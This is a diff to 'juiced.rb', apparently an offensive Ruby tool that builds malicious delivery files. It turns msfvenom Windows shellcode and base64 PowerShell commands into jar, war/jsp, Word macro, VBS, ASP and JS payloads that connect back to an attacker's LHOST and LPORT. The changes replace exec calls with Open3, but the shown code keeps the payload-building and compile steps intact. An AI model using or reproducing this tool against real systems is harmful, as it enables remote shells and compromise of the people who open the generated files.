@@ -1,12 +1,12 @@
 #!/usr/bin/env ruby
 #Author: Andrew Bonstrom
-#v1.4
+#v1.5
 #Credits to: Matthew Graber - Beastly PS Attack technique, TrustedSec group - Idea with Unicorn.py
-require 'io/console'
+require 'open3'
 require 'base64'
 def usage
 	puts "Usage: ruby juiced.rb <msf/Venom/Payload> <lhost> <lport> <payloadFormatOption> <fileName>\n\n"
-	puts "Note: A fileName is required for payload formats that output a file." 
+	puts "Note: A fileName is required for payload formats that output a file."
 	puts "Payload Format Option: jar, war, macro, ps, vbs, asp, and js."
 end
 #######################################################################################################################
@@ -14,7 +14,9 @@ end
 #######################################################################################################################
 #This first is for creating a jar file that executes the base64 encoded powershell syntax
 def gen_jarFile (base64Command, fileName)
-        #Java Code with a temp string to replace with the base64Command
+	outPut = ''
+        #Strips out the \n char that unicorn adds at the end
+        #Building the .java one liner
 	javaStr = <<-EOS
 import java.io.*;
 
@@ -41,7 +43,9 @@ EOS
 	end
 	#Builds and executes command to compile .java into .class
 	#Then it creates the jar file and cleans up
-	exec ('javac ' + fileName + '.java&&jar -cvfm ' + fileName + '.jar manifest.txt ' + fileName + '.class&&rm -f '+ fileName + '.class ' + fileName + '.java manifest.txt')
+	command = ('javac ' + fileName + '.java&&jar -cvfm ' + fileName + '.jar manifest.txt ' + fileName + '.class&&rm -f '+ fileName + '.class ' + fileName + '.java manifest.txt&&ls -l | grep ' + fileName + '.jar')
+	#Executes command and gets rid of excess output
+	Open3.popen3(command) {|stdin, stdout, stderr|}
 end
 #This second will create a fully copy/pasta word macro
 def gen_Macro (content)
@@ -121,7 +125,9 @@ EOS2
         File.open(fileName+".jsp", "w") do |f|
                 f.write(tempJspStr.to_s.sub("base64Command", base64Command))
 	end
-	exec ('mkdir tempDir&&mkdir tempDir/WEB-INF&&mv ' + fileName + '.jsp tempDir&&mv web.xml tempDir/WEB-INF&&cd tempDir/&&jar cvf ' + fileName + '.war *&&mv ' + fileName + '.war ../&&cd ../&&rm -rf tempDir')
+	command = ('mkdir tempDir&&mkdir tempDir/WEB-INF&&mv ' + fileName + '.jsp tempDir&&mv web.xml tempDir/WEB-INF&&cd tempDir/&&jar cvf ' + fileName + '.war *&&mv ' + fileName + '.war ../&&cd ../&&rm -rf tempDir')
+	#Executes command and gets rid of excess output
+        Open3.popen3(command) {|stdin, stdout, stderr|}
 end
 def gen_aspFile(base64Command, fileName)
 	#The ASP code setup for VBS
@@ -171,11 +177,10 @@ def generate_shellcode (payload, lhost, lport)
 	command = ("msfvenom -p " + payload + " LHOST=" + lhost +" LPORT=" + lport + " -a x86 --platform windows -f c")
 	puts "Now running " +  command
 	puts " "
-	#Runs commands within sub process, sleeps for 5 seconds while msfvenom builds the shellcode and then assigns it to a variable
-	IO.popen(command) do |f|
-		sleep(5)
-		newVar = f.read
-	end
+	#Executes the built msfvenom command and assigns output to variable newVar
+	Open3.popen3(command) {|stdin, stdout, stderr|
+        newVar = stdout.read
+	}
 	#Msfvenom output is sent to format function
 	formattedShellcode = format_shellcode(newVar)
 	
